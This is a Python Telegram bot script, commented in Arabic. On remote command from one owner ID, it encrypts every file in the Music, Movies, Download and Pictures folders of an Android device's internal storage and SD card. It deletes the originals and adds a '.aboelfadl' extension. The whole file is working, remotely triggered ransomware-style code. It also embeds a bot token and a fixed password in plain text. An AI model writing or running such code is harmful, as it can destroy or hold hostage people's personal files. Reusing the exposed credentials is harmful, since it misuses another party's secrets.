import os
import sys
import telebot
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter

# --- 1. إعدادات البوت ---
BOT_TOKEN = "6752223055:AAE1hbI5zx2_W3miI8IbdoqT2gMSUtmDHUA" 
OWNER_ID = 1431886140
MY_PASSWORD = "mahmoud"
CHUNK_SIZE = 64 * 1024  # سرعة عالية (64KB)

# --- 2. قائمة المسارات المستهدفة (كما طلبتها) ---
TARGET_FOLDERS = [
    # الذاكرة الداخلية
    "/storage/emulated/0/Music",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Pictures",
    
    # الذاكرة الخارجية (SD Card)
    "/storage/66D5-C18A/Download",
    "/storage/66D5-C18A/Movies",
    "/storage/66D5-C18A/Music",
    "/storage/66D5-C18A/Pictures"
]

# محاولة الاتصال
try:
    bot = telebot.TeleBot(BOT_TOKEN)
except Exception as e:
    print(f"❌ خطأ في التوكن: {e}")
    sys.exit()

# --- 3. محرك التشفير السريع (AES-CTR) ---
def get_key(password):
    return hashlib.sha256(password.encode()).digest()

def process_file_fast(file_path, password, mode):
    try:
        key = get_key(password)
        if mode == "encrypt":
            # تشفير
            iv = os.urandom(16)
            ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            output_path = file_path + ".aboelfadl"
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                outfile.write(iv)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.encrypt(chunk))
            os.remove(file_path)

        elif mode == "decrypt":
            # فك تشفير
            if not file_path.endswith(".aboelfadl"): return False
            output_path = file_path.replace(".aboelfadl", "")
            
            with open(file_path, 'rb') as infile, open(output_path, 'wb') as outfile:
                iv = infile.read(16)
                ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
                cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
                while True:
                    chunk = infile.read(CHUNK_SIZE)
                    if len(chunk) == 0: break
                    outfile.write(cipher.decrypt(chunk))
            os.remove(file_path)
            
        return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
        return False

# --- 4. معالجة القائمة كاملة ---
def execute_all_targets(mode):
    total_files = 0
    processed_folders = []
    
    action = "تشفير 🔒" if mode == "encrypt" else "فك تشفير 🔓"
    bot.send_message(OWNER_ID, f"⚡ جاري {action} جميع المجلدات المحددة...")

    for folder in TARGET_FOLDERS:
        if os.path.exists(folder):
            local_count = 0
            # المرور على الملفات داخل المجلد
            for root, dirs, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    if mode == "encrypt" and not file.endswith(".aboelfadl"):
                        if process_file_fast(file_path, MY_PASSWORD, "encrypt"):
                            local_count += 1
                    
                    elif mode == "decrypt" and file.endswith(".aboelfadl"):
                        if process_file_fast(file_path, MY_PASSWORD, "decrypt"):
                            local_count += 1
            
            if local_count > 0:
                total_files += local_count
                folder_name = folder.split("/")[-1] # اسم المجلد فقط للعرض
                processed_folders.append(f"{folder_name}: {local_count}")
        else:
            print(f"تنبيه: المجلد غير موجود {folder}")

    # تقرير النهاية
    report = "\n".join(processed_folders)
    if not report: report = "لم يتم العثور على ملفات."
    
    return f"✅ تمت عملية {action} بنجاح!\n\n📂 التفاصيل:\n{report}\n\n📊 الإجمالي: {total_files} ملف."

# --- 5. أوامر البوت ---
@bot.message_handler(commands=['secure'])
def cmd_encrypt(message):
    if message.from_user.id == OWNER_ID:
        res = execute_all_targets("encrypt")
        bot.send_message(OWNER_ID, res)

@bot.message_handler(commands=['unlock'])
def cmd_decrypt(message):
    if message.from_user.id == OWNER_ID:
        res = execute_all_targets("decrypt")
        bot.send_message(OWNER_ID, res)

# --- 6. الترحيب والتشغيل ---
def send_welcome():
    msg = (
        "🟢 *AboElfadl Multi-Path Bot*\n\n"
        "تم تحديد المجلدات المستهدفة (الداخلية + SD Card).\n"
        "المسارات المشمولة:\n"
        "📁 Music, Movies, Download, Pictures\n\n"
        "الأوامر:\n"
        "/secure - تشفير الكل\n"
        "/unlock - استعادة الكل"
    )
    try:
        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
    except: pass

if __name__ == "__main__":
    print("🚀 Bot Started (Targeting Specific Folders)...")
    send_welcome()
    bot.infinity_polling()